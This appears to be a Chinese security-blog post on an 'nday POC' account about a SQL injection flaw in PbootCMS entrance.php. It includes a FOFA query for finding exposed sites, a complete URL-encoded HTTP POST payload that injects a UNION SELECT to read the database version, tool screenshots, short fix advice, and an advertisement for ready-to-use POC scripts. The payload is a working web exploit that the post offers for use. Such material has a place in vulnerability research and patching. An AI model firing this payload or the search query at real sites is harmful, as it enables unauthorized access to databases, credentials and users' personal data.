#  PbootCMS entrance.php SQL注入漏洞   
Superhero  nday POC   2024-12-17 17:13  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
PbootCMS是一套高效、简洁、强悍的可免费商用的PHP CMS（  
内容管理系统  
）源码，专注于企业网站的开发建设。 是全新内核且永久开源免费的PHP企业网站开发建设管理系统，是一套高效、简洁、 强悍的可免费商用的PHP CMS源码，能够满足各类企业网站开发建设的需要。系统采用简单到想哭的模板标签，只要懂HTML就可快速开发企业网站。官方提供了大量网站模板免费下载和使用，将致力于为广大开发者和企业提供最佳的网站开发建设解决方案。系统采用高效、简洁、强悍的模板标签，只要懂HTML就可快速开发企业网站；PHP语言开发，使用自主研发的高速多层开发框架及缓存技术；sqlite轻型数据库，放入PHP空间即可直接使用，可选mysql. pgsql等数据库，满足各类存储需求。  
**01******  
  
**漏洞概述**  
  
  
由于PbootCMS entrance.php 文件代码逻辑缺陷存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
header="PbootCMS" || body="zbeol.com"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLfSnvoSj8gIZy7yESicTbDcIudKGlPticBQTT0naibgyxLJ4Rn1nSNgmSbVQKDwGh9SIQs96xslwm9A/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /?tag=%7d%73%71%6c%3a%20%20%7b%70%62%6f%6f%74%3a%6c%69%73%74%20%66%69%6c%74%65%72%3d%31%3d%32%29%55%4e%49%4f%4e%28%53%45%4c%45%43%54%2f%2a%2a%2f%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%28%73%65%6c%65%63%74%2f%2a%2a%2f%76%65%72%73%69%6f%6e%28%29%29%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%29%2f%2a%2a%2f%23%2f%2a%2a%2f%7c%31%32%33%20%73%63%6f%64%65%3d%31%32%33%7d%5b%6c%69%73%74%3a%6c%69%6e%6b%20%6c%69%6e%6b%3d%61%73%64%5d%7b%2f%70%62%6f%6f%74%3a%6c%69%73%74%7d HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
查询数据库版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLfSnvoSj8gIZy7yESicTbDcnhCWEcDibDXXRajFYQUdOreic8VhIW2ianW5OHyMwhfkue1JRUr23aXqg/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLfSnvoSj8gIZy7yESicTbDcXOHR0PctlLgu3EFAYvOnpphdGylUddRicfKY5eRxgickWicktMFCOpuuA/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLfSnvoSj8gIZy7yESicTbDcOCx4ukp1l7ElFVrGrM7cI2LPWaPmTdSb0S3A9cDvibjLV2TYCfFmiajw/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLfSnvoSj8gIZy7yESicTbDcvpMsT2ceNicO1q2k6vHfcgibebYR9vXHJsmnX4h0Kib9BFFq7iahsIeUaQ/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、  
官方已修复该漏洞，请用户联系厂商修复漏洞：https://www.pbootcms.com/  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
